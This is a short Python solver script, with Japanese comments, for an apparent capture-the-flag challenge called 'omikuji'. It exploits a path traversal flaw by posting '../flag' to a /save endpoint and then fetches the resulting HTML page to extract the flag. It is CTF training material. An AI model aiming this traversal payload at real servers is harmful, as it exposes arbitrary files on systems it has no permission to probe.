import requests

# === omikuji solver ===
#
# 脆弱性: Path Traversal
#
# /save エンドポイントの POST body (type) がそのまま readFile に渡される:
#   getResultContent(type) → readFile(`${import.meta.dirname}/${type}`)
#
# import.meta.dirname = /app → "../flag" で /flag を読める
# 読み出した内容は HTML として保存され、そのパスが返される

import sys

if len(sys.argv) > 1:
    BASE = sys.argv[1].rstrip('/')
else:
    BASE = 'http://localhost:3456'

print(f'[*] Target: {BASE}')

# Path Traversal で /flag を読む
r = requests.post(f'{BASE}/save', data='../flag')
print(f'[*] Response: {r.json()}')

location = r.json()['location']
print(f'[*] Saved to: {location}')

# 保存されたHTMLファイルからフラグを取得
r2 = requests.get(f'{BASE}{location}')
print(f'[*] HTML content:')
print(r2.text)

# フラグ部分を抽出
import re
match = re.search(r'<pre>(.*?)</pre>', r2.text, re.DOTALL)
if match:
    flag = match.group(1).strip()
    print(f'\n[+] FLAG: {flag}')
